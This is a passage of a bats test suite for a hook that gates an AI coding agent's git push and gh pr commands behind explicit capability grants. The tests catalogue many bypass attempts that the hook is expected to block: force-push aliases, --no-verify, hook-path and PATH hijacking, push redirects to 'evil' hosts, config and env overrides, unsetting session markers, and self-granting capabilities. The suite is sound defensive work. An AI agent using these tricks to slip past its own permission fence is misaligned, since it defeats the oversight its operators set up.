    AGENT_UNFENCE=push run fire "git -c alias.pf='push --force' pf origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=history run fire "git -c alias.x='reset --hard' x"
    [ "$status" -eq 2 ]
    run fire "git --config-env=alias.p=P p"
    [ "$status" -eq 2 ]
}

@test "push does not lift --exec-path=<dir>" {
    AGENT_UNFENCE=push run fire "git --exec-path=/tmp/ai/evil push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "git --exec-path as a read stays allowed" {
    run fire "git --exec-path"
    [ "$status" -eq 0 ]
}

@test "push does not lift git config env overrides" {
    local v
    for v in GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_CONFIG_NOSYSTEM=1 "GIT_CONFIG_PARAMETERS='alias.p=push'" GIT_CONFIG_COUNT=1 GIT_DIR=/tmp/ai/x/.git GIT_WORK_TREE=/tmp/ai/x GIT_EXEC_PATH=/tmp/ai/evil "GIT_SSH_COMMAND='ssh -i /tmp/ai/k'" GIT_SSH=/tmp/ai/evil GIT_PROXY_COMMAND=/tmp/ai/evil GIT_NAMESPACE=x HOME=/tmp/ai/home XDG_CONFIG_HOME=/tmp/ai/cfg; do
        AGENT_UNFENCE=push run fire "$v git push origin feature/x"
        [ "$status" -eq 2 ] || { echo "not blocked: $v"; return 1; }
        AGENT_UNFENCE=push run fire "env $v git push origin feature/x"
        [ "$status" -eq 2 ] || { echo "not blocked: env $v"; return 1; }
        AGENT_UNFENCE=push run fire "export $v; git push origin feature/x"
        [ "$status" -eq 2 ] || { echo "not blocked: export $v"; return 1; }
    done
}

@test "git env overrides are blocked without any push too" {
    run fire "GIT_CONFIG_GLOBAL=/dev/null git commit -m 'feat: x'"
    [ "$status" -eq 2 ]
    run fire "HOME=/tmp/ai/home git status"
    [ "$status" -eq 2 ]
}

@test "harmless git env stays allowed" {
    AGENT_UNFENCE=push run fire "GIT_TRACE=1 GIT_CURL_VERBOSE=1 git push origin feature/x"
    [ "$status" -eq 0 ]
    run fire "GIT_AUTHOR_NAME=t GIT_PAGER=cat git log -1"
    [ "$status" -eq 0 ]
    run fire "GIT_EDITOR=true git commit -m 'feat: x'"
    [ "$status" -eq 0 ]
}

@test "PATH is not rewritten around git or gh" {
    AGENT_UNFENCE=push run fire "PATH=/tmp/ai/evil:\$PATH git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "env PATH=/tmp/ai/evil gh pr create --fill"
    [ "$status" -eq 2 ]
    run fire "export PATH=/tmp/ai/evil:\$PATH; git status"
    [ "$status" -eq 2 ]
    run fire "PATH=/tmp/ai/evil:\$PATH /usr/bin/git status"
    [ "$status" -eq 2 ]
}

@test "PATH may be rewritten around anything else" {
    run fire "PATH=/opt/homebrew/bin:\$PATH make test"
    [ "$status" -eq 0 ]
    run fire "env PATH=/tmp/ai/bin:\$PATH cargo build"
    [ "$status" -eq 0 ]
}

@test "marker tampering is blocked without any push in the command" {
    run fire "unset CLAUDECODE"
    [ "$status" -eq 2 ]
    run fire "env -u AGENT_SESSION make release"
    [ "$status" -eq 2 ]
}

@test "an env prefix that leaves the markers alone stays allowed" {
    AGENT_UNFENCE=push run fire "env GIT_TRACE=1 git push origin feature/x"
    [ "$status" -eq 0 ]
    run fire "env -u FOO make test"
    [ "$status" -eq 0 ]
}

# hook and remote-side bypasses

@test "push does not lift --no-verify" {
    AGENT_UNFENCE=push run fire "git push --no-verify origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift -c core.hooksPath" {
    AGENT_UNFENCE=push run fire "git -c core.hooksPath=/dev/null push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --receive-pack" {
    AGENT_UNFENCE=push run fire "git push --receive-pack=/tmp/ai/evil origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --exec" {
    AGENT_UNFENCE=push run fire "git push --exec=/tmp/ai/evil origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift --repo" {
    AGENT_UNFENCE=push run fire "git push --repo=https://github.com/o/r.git feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push --repo origin feature/x"
    [ "$status" -eq 2 ]
}

# targets that are not a configured remote name

@test "push does not lift an https url target" {
    AGENT_UNFENCE=push run fire "git push https://github.com/o/r.git feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift an scp-style url target" {
    AGENT_UNFENCE=push run fire "git push git@github.com:o/r.git feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift an ssh:// url target" {
    AGENT_UNFENCE=push run fire "git push ssh://git@host/o/r feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a file:// url target" {
    AGENT_UNFENCE=push run fire "git push file:///tmp/ai/bare.git feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift an absolute path target" {
    AGENT_UNFENCE=push run fire "git push /tmp/ai/bare.git feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a relative path target" {
    AGENT_UNFENCE=push run fire "git push ./bare feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=push run fire "git push ../bare feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a tilde path target" {
    AGENT_UNFENCE=push run fire "git push ~/bare feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a bare-repo-looking .git target" {
    AGENT_UNFENCE=push run fire "git push evil.git feature/x"
    [ "$status" -eq 2 ]
}

# one-shot config that redirects or widens the push

@test "push does not lift -c remote.<r>.pushurl" {
    AGENT_UNFENCE=push run fire "git -c remote.origin.pushurl=git@evil:o/r.git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a glued -cremote.<r>.url" {
    AGENT_UNFENCE=push run fire "git -cremote.origin.url=git@evil:o/r.git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift -c url.<base>.pushInsteadOf" {
    AGENT_UNFENCE=push run fire "git -c url.git@evil:.pushInsteadOf=git@github.com: push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift -c push.default=matching" {
    AGENT_UNFENCE=push run fire "git -c push.default=matching push"
    [ "$status" -eq 2 ]
}

@test "push does not lift -c branch.<b>.pushRemote" {
    AGENT_UNFENCE=push run fire "git -c branch.main.pushRemote=evil push"
    [ "$status" -eq 2 ]
}

@test "push does not lift -c remote.pushDefault" {
    AGENT_UNFENCE=push run fire "git -c remote.pushDefault=evil push"
    [ "$status" -eq 2 ]
}

@test "push does not lift --config-env=remote.<r>.pushurl" {
    AGENT_UNFENCE=push run fire "git --config-env=remote.origin.pushurl=EVIL push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "a -c push.* one-shot on a non-push subcommand stays allowed" {
    run fire "git -c push.default=simple status"
    [ "$status" -eq 0 ]
}

# chains

@test "push does not lift a force push chained after a clean one" {
    AGENT_UNFENCE=push run fire "git push origin feature/x && git push --force origin feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a delete chained after a clean push" {
    AGENT_UNFENCE=push run fire "git push origin feature/x; git push origin :feature/x"
    [ "$status" -eq 2 ]
}

@test "push does not lift a url push on the second line of a script" {
    AGENT_UNFENCE=push run fire "git push origin feature/x
git push git@evil:o/r.git feature/x"
    [ "$status" -eq 2 ]
}

# push lifts push only

@test "push does not lift git tag" {
    AGENT_UNFENCE=push run fire "git tag v1.0"
    [ "$status" -eq 2 ]
}

@test "push does not lift the branch category" {
    AGENT_UNFENCE=push run fire "git switch main"
    [ "$status" -eq 2 ]
}

@test "push does not lift the history category" {
    AGENT_UNFENCE=push run fire "git rebase main"
    [ "$status" -eq 2 ]
}

@test "push does not lift git remote add" {
    AGENT_UNFENCE=push run fire "git remote add evil git@evil:o/r.git"
    [ "$status" -eq 2 ]
}

@test "push does not lift git config of a push key" {
    AGENT_UNFENCE=push run fire "git config push.default matching"
    [ "$status" -eq 2 ]
}

@test "push does not lift gh pr create" {
    AGENT_UNFENCE=push run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "push composes with other capabilities" {
    AGENT_UNFENCE=branch,push run fire "git push -u origin feature/x"
    [ "$status" -eq 0 ]
}

@test "an unrelated capability does not lift the push fence" {
    AGENT_UNFENCE=pr run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=meta run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the push fence" {
    AGENT_UNFENCE= run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the push fence" {
    AGENT_UNFENCE=pushy run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=nopush run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "the push capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=push git push origin feature/x"
    [ "$status" -eq 2 ]
    run fire "AGENT_UNFENCE=push git push origin feature/x"
    [ "$status" -eq 2 ]
}

@test "the push fence names the capability in its reason" {
    run fire "git push origin feature/x"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=push"* ]]
}

@test "the hard push fence does not name a capability" {
    AGENT_UNFENCE=push run fire "git push --force origin feature/x"
    [ "$status" -eq 2 ]
    [[ "$output" != *"AGENT_UNFENCE=push"* ]]
    [[ "$output" == *"every capability"* ]]
}

# -- the pr capability ----------------------------------------------------
# AGENT_UNFENCE=pr lifts `gh pr create` against the current repo. the title,
# when given inline, carries a conventional commits prefix; the body -- inline
# or a file -- is ascii with no agent attribution. every other gh write, and
# git push, stay where they were.

@test "pr allows gh pr create with a conventional title" {
    AGENT_UNFENCE=pr run fire "gh pr create --title 'feat: thing' --body 'does x'"
    [ "$status" -eq 0 ]
}

@test "pr allows the -t / -b short flags" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'fix(hooks): thing' -b 'body'"
    [ "$status" -eq 0 ]
}

@test "pr allows the --title= form" {
    AGENT_UNFENCE=pr run fire "gh pr create --title='docs: thing' --body='b'"
    [ "$status" -eq 0 ]
}

@test "pr allows double-quoted and unquoted titles" {
    AGENT_UNFENCE=pr run fire "gh pr create -t \"chore: thing\" -b b"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t refactor: -b b"
    [ "$status" -eq 0 ]
}

@test "pr allows the ! and ? suffix markers" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat!: break' -b b"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'fix?: unverified' -b b"
    [ "$status" -eq 0 ]
}

@test "pr allows --fill and its variants" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -f"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create --fill-first --draft"
    [ "$status" -eq 0 ]
}

@test "pr allows --web" {
    AGENT_UNFENCE=pr run fire "gh pr create --web"
    [ "$status" -eq 0 ]
}

@test "pr allows --base / --head / reviewers / labels" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill --base main --head feature/x -r someone -l bug -a @me"
    [ "$status" -eq 0 ]
}

@test "pr allows a heredoc body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body \"\$(cat <<'EOF'
this PR adds x.

- one
- two
EOF
)\""
    [ "$status" -eq 0 ]
}

@test "pr allows a readable absolute body file" {
    printf 'this PR adds x.\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file=$BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
}

@test "pr allows a quoted absolute body file" {
    printf 'this PR adds x.\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file \"$BATS_TEST_TMPDIR/body.md\""
    [ "$status" -eq 0 ]
}

@test "pr allows gh pr create after a read on the same line" {
    AGENT_UNFENCE=pr run fire "gh pr view 1 || gh pr create --fill"
    [ "$status" -eq 0 ]
}

@test "pr allows a folded double-space gh pr create" {
    AGENT_UNFENCE=pr run fire "gh  pr  create --fill"
    [ "$status" -eq 0 ]
}

# not without the capability

@test "gh pr create stays blocked without the capability" {
    run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=pr"* ]]
}

# current repo only

@test "pr does not lift -R" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill -R o/r"
    [ "$status" -eq 2 ]
}

@test "pr does not lift --repo" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill --repo o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create --fill --repo=o/r"
    [ "$status" -eq 2 ]
}

# title

@test "pr blocks a title without a conventional prefix" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'Add thing' -b b"
    [ "$status" -eq 2 ]
}

@test "pr blocks a capitalised prefix" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'Feat: thing' -b b"
    [ "$status" -eq 2 ]
}

@test "pr blocks a prefix without the space after the colon" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat:thing' -b b"
    [ "$status" -eq 2 ]
}

@test "pr blocks a prefix that is only a prefix of a type" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feature: thing' -b b"
    [ "$status" -eq 2 ]
}

@test "pr blocks a title built by command substitution" {
    AGENT_UNFENCE=pr run fire "gh pr create -t \"\$(head -1 /tmp/ai/msg)\" -b b"
    [ "$status" -eq 2 ]
}

@test "pr blocks a title on a second gh pr create in the chain" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: ok' -b b && gh pr create -t 'Bad' -b b"
    [ "$status" -eq 2 ]
}

# gh short flags glue their value and stack behind the booleans

@test "pr checks a glued -t value" {
    AGENT_UNFENCE=pr run fire "gh pr create -t'Add thing' -b b"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -tAdd -b b"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t'feat: thing' -b b"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t=feat: -b b"
    [ "$status" -eq 0 ]
}

@test "pr checks -t stacked behind boolean short flags" {
    AGENT_UNFENCE=pr run fire "gh pr create -dt 'Add thing' -b b"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -dwt'Add thing' -b b"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -dt 'feat: thing' -b b"
    [ "$status" -eq 0 ]
}

@test "pr blocks -R glued or stacked" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill -Ro/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -fR o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -dfR o/r"
    [ "$status" -eq 2 ]
}

@test "pr checks a glued or stacked -F body file" {
    printf 'does x\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F$BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -dF $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 2 ]
    printf 'does x\n' > "$BATS_TEST_TMPDIR/clean.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -F$BATS_TEST_TMPDIR/clean.md"
    [ "$status" -eq 0 ]
}

@test "pr does not mistake -r / -l / -T for -R / -t / -F" {
    AGENT_UNFENCE=pr run fire "gh pr create --fill -r someone -l wontfix -T pull_request_template.md"
    [ "$status" -eq 0 ]
}

# text must be literal

@test "pr blocks a body read from a file by substitution" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat /tmp/ai/body.md)\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\`cat /tmp/ai/body.md\`\""
    [ "$status" -eq 2 ]
}

@test "pr blocks a body from a variable" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$BODY\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\${BODY}\""
    [ "$status" -eq 2 ]
}

@test "pr blocks ansi-c quoting, which rebuilds banned text from escapes" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \$'Co-Auth\\x6fred-By: x'"
    [ "$status" -eq 2 ]
}

@test "pr blocks a substitution hidden behind a pipe in the body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'a | \$(cat /tmp/ai/body.md)'"
    [ "$status" -eq 2 ]
}

@test "pr blocks a substitution elsewhere on the line" {
    AGENT_UNFENCE=pr run fire "cd \$(git rev-parse --show-toplevel) && gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "pr allows the inline heredoc forms" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
body
EOF
)\""
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\"EOF\"
body
EOF
)\""
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<-'EOF'
	body
	EOF
)\""
    [ "$status" -eq 0 ]
}

@test "pr blocks a heredoc whose body carries a substitution" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
\$(cat /tmp/ai/body.md)
EOF
)\""
    [ "$status" -eq 2 ]
}

# a quoted heredoc body is literal, so markdown and dollar signs are fine
# there; the attribution and ascii scans still see it

@test "pr allows backticks and dollars inside a quoted heredoc body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
this PR adds \`make lint-sh\` and drops \$HOME from the \${PATH} lookup.

- \`git push\` costs \$5 (\`\$(true)\`)
EOF
)\""
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\"EOF\"
\`code\`
EOF
)\""
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<\\EOF
\`code\`
EOF
)\""
    [ "$status" -eq 0 ]
}

@test "pr allows two quoted heredocs on one line" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
\`one\`
EOF
)\" && gh pr create -t 'feat: y' -b \"\$(cat <<'EOF'
\`two\`
EOF
)\""
    [ "$status" -eq 0 ]
}

@test "pr blocks backticks in an unquoted heredoc body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<EOF
\`cat /tmp/ai/body.md\`
EOF
)\""
    [ "$status" -eq 2 ]
}

@test "pr blocks backticks in a plain quoted body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'run \`make test\`'"
    [ "$status" -eq 2 ]
}

@test "pr blocks a substitution outside the quoted heredoc" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
\`code\`
EOF
)\" --head \"\$(git branch --show-current)\""
    [ "$status" -eq 2 ]
}

@test "pr blocks a quoted heredoc with no terminator" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
\`code\`
)\""
    [ "$status" -eq 2 ]
}

@test "pr still scans a quoted heredoc body for attribution and ascii" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
does x

Co-Authored-By: Claude <noreply@anthropic.com>
EOF
)\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b \"\$(cat <<'EOF'
does x $(printf '\342\200\224') y
EOF
)\""
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file that is not a regular file" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /dev/stdin < /tmp/ai/body.md"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /dev/fd/0"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file /tmp"
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file from process substitution" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file <(printf 'x')"
    [ "$status" -eq 2 ]
}

@test "pr blocks --recover" {
    AGENT_UNFENCE=pr run fire "gh pr create --recover /tmp/ai/state.json"
    [ "$status" -eq 2 ]
}

@test "pr blocks gh env overrides" {
    AGENT_UNFENCE=pr run fire "GH_REPO=o/r gh pr create --fill"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "env GH_HOST=ghe.example.com gh pr create --fill"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "GH_TOKEN=x gh pr create --fill"
    [ "$status" -eq 2 ]
}

# attribution and ascii

@test "pr blocks a Co-Authored-By trailer in the body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'does x

Co-Authored-By: Claude <noreply@anthropic.com>'"
    [ "$status" -eq 2 ]
}

@test "pr blocks a Generated with line in the body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'does x

Generated with [Claude Code](https://claude.com/claude-code)'"
    [ "$status" -eq 2 ]
}

@test "pr blocks attribution regardless of case" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'co-authored-by: someone'"
    [ "$status" -eq 2 ]
}

@test "pr blocks an em-dash in the body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b 'a $(printf '\342\200\224') b'"
    [ "$status" -eq 2 ]
}

@test "pr blocks an emoji in the body" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' -b '$(printf '\360\237\244\226') generated'"
    [ "$status" -eq 2 ]
}

@test "pr blocks a curly quote in the title" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: $(printf '\342\200\234')x$(printf '\342\200\235')' -b b"
    [ "$status" -eq 2 ]
}

# body file

@test "pr blocks a relative body file" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file body.md"
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file from stdin" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file -"
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file under an unexpanded variable" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file \$HOME/body.md"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file ~/body.md"
    [ "$status" -eq 2 ]
}

@test "pr blocks an unreadable body file" {
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/missing.md"
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file carrying attribution" {
    printf 'does x\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 2 ]
}

@test "pr blocks a body file with non-ascii content" {
    printf 'does x \342\200\224 and y\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr create -t 'feat: x' --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 2 ]
}

# pr lifts gh pr create only

@test "pr does not lift gh pr comment / ready / close" {
    AGENT_UNFENCE=pr run fire "gh pr comment 1 --body x"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr ready 1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr close 1"
    [ "$status" -eq 2 ]
}

@test "pr does not lift gh pr merge" {
    AGENT_UNFENCE=pr run fire "gh pr merge 1"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr create --fill && gh pr merge --auto"
    [ "$status" -eq 2 ]
}

@test "pr does not lift gh issue create" {
    AGENT_UNFENCE=pr run fire "gh issue create --title x --body y"
    [ "$status" -eq 2 ]
}

@test "pr does not lift a gh api pull-request write" {
    AGENT_UNFENCE=pr run fire "gh api repos/o/r/pulls -f title=x -f head=b -f base=main"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh api -X POST repos/o/r/pulls --input body.json"
    [ "$status" -eq 2 ]
}

@test "pr does not lift a createPullRequest graphql mutation" {
    AGENT_UNFENCE=pr run fire "gh api graphql -f query='mutation { createPullRequest(input: {}) { clientMutationId } }'"
    [ "$status" -eq 2 ]
}

@test "pr does not lift git push" {
    AGENT_UNFENCE=pr run fire "git push -u origin feature/x && gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "pr composes with push" {
    AGENT_UNFENCE=push,pr run fire "git push -u origin feature/x && gh pr create --fill"
    [ "$status" -eq 0 ]
}

@test "an unrelated capability does not lift the pr fence" {
    AGENT_UNFENCE=push run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=meta run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "an empty AGENT_UNFENCE does not lift the pr fence" {
    AGENT_UNFENCE= run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "a substring of a capability name does not lift the pr fence" {
    AGENT_UNFENCE=prs run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=nopr run fire "gh pr create --fill"
    [ "$status" -eq 2 ]
}

@test "the pr capability cannot be granted from inside the command text" {
    run fire "env AGENT_UNFENCE=pr gh pr create --fill"
    [ "$status" -eq 2 ]
}

# pr also lifts gh pr edit, title and body only, under the create rules

@test "pr allows gh pr edit of the title and body" {
    AGENT_UNFENCE=pr run fire "gh pr edit --title 'feat: better title'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body 'updated'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit feature/x -t 'fix(hooks): x' -b 'y'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit https://github.com/o/r/pull/12 --title='docs: x' --body='y'"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit -t'chore: x'"
    [ "$status" -eq 0 ]
}

@test "pr allows gh pr edit with a heredoc body full of markdown" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body \"\$(cat <<'EOF'
this PR adds \`thing\` -- see below.

- one | two
- \`make test\` passes

| flag | effect |
|---|---|
| -f | force |
EOF
)\""
    [ "$status" -eq 0 ]
}

@test "pr allows gh pr edit with an absolute body file" {
    printf 'updated body\n' > "$BATS_TEST_TMPDIR/body.md"
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body-file $BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 -F$BATS_TEST_TMPDIR/body.md"
    [ "$status" -eq 0 ]
}

@test "gh pr edit stays blocked without the capability" {
    run fire "gh pr edit 12 --title 'feat: x'"
    [ "$status" -eq 2 ]
    [[ "$output" == *"AGENT_UNFENCE=pr"* ]]
}

@test "pr does not lift gh pr edit of anything but the title and body" {
    local flag
    for flag in "--add-reviewer someone" "--remove-reviewer someone" "--add-assignee @me" "--remove-assignee @me" "--add-project x" "--remove-project x" "--milestone v1" "-m v1" "--base main" "-B main"; do
        AGENT_UNFENCE=pr run fire "gh pr edit 12 $flag"
        [ "$status" -eq 2 ] || { echo "not blocked: $flag"; return 1; }
        AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x' $flag"
        [ "$status" -eq 2 ] || { echo "not blocked with a title: $flag"; return 1; }
    done
}

@test "pr does not lift gh pr edit -R / --repo" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x' -R o/r"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'feat: x' --repo=o/r"
    [ "$status" -eq 2 ]
}

@test "pr edit keeps the create rules for the title and body" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --title 'Better title'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body 'x

Co-Authored-By: Claude <noreply@anthropic.com>'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body 'a $(printf '\342\200\224') b'"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body \"\$(cat /tmp/ai/body.md)\""
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body-file body.md"
    [ "$status" -eq 2 ]
    AGENT_UNFENCE=pr run fire "GH_REPO=o/r gh pr edit 12 --title 'feat: x'"
    [ "$status" -eq 2 ]
}

@test "a flag hidden inside a quoted body is not a flag" {
    AGENT_UNFENCE=pr run fire "gh pr edit 12 --body 'pass --add-reviewer someone to gh'"
    [ "$status" -eq 0 ]
